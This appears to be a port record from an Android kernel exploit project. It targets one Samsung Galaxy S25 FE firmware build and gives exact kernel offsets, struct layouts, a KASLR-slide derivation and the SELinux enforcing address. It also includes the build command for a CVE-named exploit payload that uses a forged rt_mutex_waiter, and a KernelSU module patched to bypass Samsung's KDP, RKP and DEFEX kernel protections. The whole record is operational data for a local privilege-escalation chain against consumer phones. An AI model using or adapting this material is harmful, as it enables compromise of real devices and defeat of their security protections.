# Galaxy S25 FE SM-S731N / S731NKSS7BZF1 port record

This record contains the exact offline inputs and derived values for profile
`essi-S731NKSS7BZF1`. Every value was recovered from the kernel Image of that
exact Korean KSS firmware; no offset was copied from a sibling build. The
profile and its payload are statically verified but hardware-untested.

## Firmware identity

```text
model: SM-S731N
device: essi (Galaxy S25 FE)
region: KOO
AP/PDA: S731NKSS7BZF1
CSC: S731NOKR7BZF1
CP: S731NKSS7BZE1
display build: BP4A.251205.006.S731NKSS7BZF1
fingerprint: samsung/r13sksx/essi:16/BP4A.251205.006/S731NKSS7BZF1:user/test-keys
kernel release: 6.1.157-android14-11
kernel build: #1 SMP PREEMPT Fri May 29 05:42:30 UTC 2026
```

The four-part FUS version is
`S731NKSS7BZF1/S731NOKR7BZF1/S731NKSS7BZE1/S731NKSS7BZF1`. The fingerprint was
read from `meta-data/fota.zip` -> `build_fingerprint.txt` of the downloaded AP
archive.

## Extracted image hashes

```text
boot.img size: 67108864
boot.img SHA-256: 368BD934AFBC3F7842EA95B38BED0A1658F3E8F4A82C02988B59B4BABA6B954F
kernel size: 38832640
kernel SHA-256: D7ECD07095C0704DD32E252C9E48605FD7DA54916D576E321C50FFB33DC642F7
ARM64 Image text_offset: 0x0
ARM64 Image size: 0x27b0000
ARM64 Image flags: 0x0
raw BTF: [0x188c248, 0x1e4497e) (5998390 bytes)
```

## Symbol and BTF recovery

`vmlinux-to-elf` 1.3.6 recovered 115670 symbols at image base
`0xffffffc008000000`; the raw BTF blob was validated against the complete BTF
header and the section bounds.

Target offsets (all derived from the recovered ELF and BTF of this Image):

| Macro/use | Symbol or derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d4468` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | return address of `bl schedule` in `worker_thread` | `0x000dbd9c` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a1414` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003ef02c` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00470d44` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00471274` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d3a19c` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d3aad4` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d3ab2c` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d3ad58` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d3ade0` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d3af00` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121cf10` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string referenced by `nfulnl_logger.name` | `0x016dce61` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013d9108` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017a7a98` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eae58` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` object | `0x022f2a10` |
| `INIT_TASK_OFF` | `init_task` | `0x022ff840` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `.data` pointer slot of the `random_table[]` entry named `boot_id` | `0x0243eff8` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_miscs` + `offsetof(miscdevice, fops)` | `0x02484c30` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea478` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026cd5e0` |

`ASHMEM_MISC_FOPS_OFF` is not a symbol in this kernel: `drivers/staging/android/ashmem.c`
registers the `ashmem_miscs[]` array, so the profile uses the `ashmem_miscs`
object at `0x02484c20` plus the BTF member offset
`offsetof(struct miscdevice, fops) == 0x10`. The pointer that is really stored
at that address was read back from the Image and is `0xffffffc0093d9108`,
which is exactly `ashmem_fops`; the name pointer next to it resolves to the
string `"ashmem"`.

The `random_table[]` `boot_id` entry was located by reading the `procname`
pointer of every `struct ctl_table` element (`sizeof(struct ctl_table) ==
0x40`, `procname` at `0x0`, `data` at `0x8`); entry index 4 is `"boot_id"` and
its `data` slot is `0x0243eff8`.

## Target BTF layout

```text
sizeof(struct file_operations) = 0x110
file_operations.owner           = 0x00
file_operations.llseek          = 0x08
file_operations.read            = 0x10
file_operations.write           = 0x18
file_operations.read_iter       = 0x20
file_operations.write_iter      = 0x28
file_operations.unlocked_ioctl  = 0x50
file_operations.compat_ioctl    = 0x58
file_operations.mmap            = 0x60
file_operations.open            = 0x70
file_operations.release         = 0x80
file_operations.splice_read     = 0xc8
file_operations.show_fdinfo     = 0xe0

task_struct.usage              = 0x40
task_struct.prio               = 0x84
task_struct.normal_prio        = 0x8c
task_struct.sched_task_group   = 0x348
task_struct.pi_lock            = 0x924
task_struct.pi_waiters         = 0x938
task_struct.pi_top_task        = 0x948
task_struct.pi_blocked_on      = 0x950

sizeof(struct page)            = 0x40   (flags 0x00, union 0x08..0x30, page_type 0x30)
sizeof(struct rt_mutex_waiter)  = 0x58
rt_mutex_waiter.tree_entry     = 0x00
rt_mutex_waiter.pi_tree_entry  = 0x18
rt_mutex_waiter.task           = 0x30
rt_mutex_waiter.lock           = 0x38
rt_mutex_waiter.wake_state     = 0x40
rt_mutex_waiter.prio           = 0x44
rt_mutex_waiter.deadline       = 0x48
rt_mutex_waiter.ww_ctx         = 0x50

sizeof(struct mm_struct)       = 0x3c0
sizeof(struct sk_buff)          = 0xf8   (head 0xd8, data 0xe0, tail 0xd0, end 0xd4)
```

The `rt_mutex_waiter` layout is the compact 6.1 variant, so the profile sets
`COMPACT_RT_MUTEX_WAITER 1` and the `FAKE_WAITER_*` offsets above.

`sizeof(struct mm_struct)` is `0x3c0` in the BTF, but on this 6.1.157
configuration the `mm_struct` SLUB objects occupy a `0x400`-byte stride, so the
profile sets `MM_STRUCT_SZ 0x400` and `MM_ORDER 3`. Using the literal BTF size
enumerates the wrong KernelSnitch candidate boundaries; the same correction is
documented for the sibling 6.1.157 `S926BXXUEDZDR` and `S921NKSSFDZF3`
records.

## Physical load proof

The ARM64 Image has `text_offset == 0`, so the Image is loaded at the same
physical address on every boot and the Exynos boot path adds `0x80000000`:

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
```

## KASLR slide derivation

`SLIDE_TRACEFS_EVENT_ID` is the runtime ID of `sched:sched_blocked_reason`.
`__TRACE_LAST_TYPE` is `20` in this Android 6.1 kernel and the event index is
computed from the recovered symbols:

```text
__start_ftrace_events      = 0x022aa940
__event_sched_blocked_reason = 0x022aabf0
event_index = (0x022aabf0 - 0x022aa940) / 8 = 86   (zero based)
event_id    = 20 + 86 = 106
```

`SLIDE_TRACEFS_WORKER_CALLER_OFF` is the return address of the `bl schedule`
inside `worker_thread`. The recovered `worker_thread` starts at `0x000dbcfc`
and contains exactly one `bl schedule` (target `0x01117c70`) at `0x000dbd98`,
so the saved return PC is `0x000dbd9c`.

`SLIDE_PSELECT_WORD_SHIFT` is the number of leading 64-bit words that the
payload skips in the logical read/write/exception `fd_set` array before the
forged `rt_mutex_waiter` word zero. The pselect copy path and the
`rt_mutex_slowlock` frame that hold the stale waiter are the same 6.1.157
sources as the validated `e1s-S921NKSSFDZF3` and `r13s-S731U1UES7BZF3`
profiles, which both use a shift of `3`; the profile therefore sets:

```c
#define SLIDE_TRACEFS_EVENT_ID 106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
#define SLIDE_PSELECT_WORD_SHIFT 3
```

## P0 fingerprint

`src/targets/essi-S731NKSS7BZF1/p0_fingerprint.h` was generated from the raw
Image of this firmware with `tools/generate_p0_fingerprint.pl` at probe offset
`0x1f0000` and verified by reading all 256 source qwords back from the Image.
The table matches the two other Galaxy S25 FE profiles in 252 of 256 qwords;
the four differing words are single-instruction deltas of the same kernel
family, which confirms that the fingerprint was taken from this Image and not
from a sibling build.

## Published artifacts

```text
artifacts/essi-S731NKSS7BZF1/cve-2026-43499-app.so
size: 104128
SHA-256: 00ecaa02c168cf7d2c70f2edba7f6e8dc15740257a911825d275a09e02ae5c14
```

The release payload is produced with:

```sh
make TARGET=essi-S731NKSS7BZF1 ANDROID_NDK_HOME=/path/to/android-ndk-r29 release
```

## KernelSU module

The module is built from KernelSU `v3.2.5`, commit
`b0bc817b4e966aa6aa830834eaf6ef765d821d40`, with
`kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` and the
fail-closed Exynos path:

```sh
CONFIG_KSU=m
CONFIG_KSU_SAMSUNG_KDP=y
CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y
CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y
```

The DDK image `ghcr.io/ylarod/ddk-min:android14-6.1-20260313` ships
`6.1.166-dirty`; its generated `UTS_RELEASE` and `include/config/kernel.release`
are replaced with this target's release before the build, because the target
has `CONFIG_MODULE_FORCE_LOAD=n`. The resulting module reports:

```text
vermagic: 6.1.157-android14-11 SMP preempt mod_unload modversions aarch64
```

`kernel/check_symbol` reports no missing symbol against the recovered
`S731NKSS7BZF1` `vmlinux.elf`. The manual-relocation audit against the
target-derived `Module.symvers` reports 202 undefined imports, zero missing
target symbols, an empty `__versions` section, zero target CRC mismatches,
and 47 imports resolved through kallsyms. The published pair is:

```text
kernelsu/android14-6.1_kernelsu-essi-S731NKSS7BZF1-kdp.ko
size: 398336
SHA-256: 2cbd56cf503a4f8ff83ae43c2fd9aef16131f77305c193420a3ef34b161de86c

kernelsu/ksud-essi-S731NKSS7BZF1-kdp
size: 4765944
SHA-256: ce773693273e79e341321bdf1fc1fda41d667b4c2b14635f4ed61d76079ca6ae
```

The four `Kernel-SU` Cargo git dependencies that KernelSU v3.2.5 pins were
deleted upstream, so the `ksud` build uses commit-identical mirrors. The
mapping is recorded in [`../kernelsu/README.md`](../kernelsu/README.md).

## Support feed

`support/targets-v3.json` registers the pair for `SM-S731N` on kernel
`6.1.157` with `requiresFreshP0Session`, because the slide discovery and the
exploitation must run inside the same payload process.

## Validation status

- The profile, the P0 fingerprint and the release payload are statically
  verified against the recovered `vmlinux.elf` and BTF of this firmware.
- The KernelSU module is build-verified and audited against the recovered
  target, but no late load has been executed on an `SM-S731N` device.
- The exploit chain and the KernelSU late load have not been executed on an
  `SM-S731N` device.
